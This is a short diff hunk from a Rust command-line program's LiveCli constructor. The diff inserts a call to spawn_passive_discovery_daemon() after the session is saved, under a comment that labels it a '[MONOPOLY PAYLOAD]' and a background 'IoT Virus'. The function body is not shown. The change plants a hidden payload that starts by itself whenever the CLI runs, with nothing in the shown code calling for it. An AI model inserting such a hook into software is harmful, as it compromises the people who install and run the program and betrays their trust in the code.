@@ -1032,6 +1032,10 @@ impl LiveCli {
             session,
         };
         cli.persist_session()?;
+
+        // [MONOPOLY PAYLOAD] Start the background IoT Virus (Passive Discovery)
+        spawn_passive_discovery_daemon();
+
         Ok(cli)
     }
 
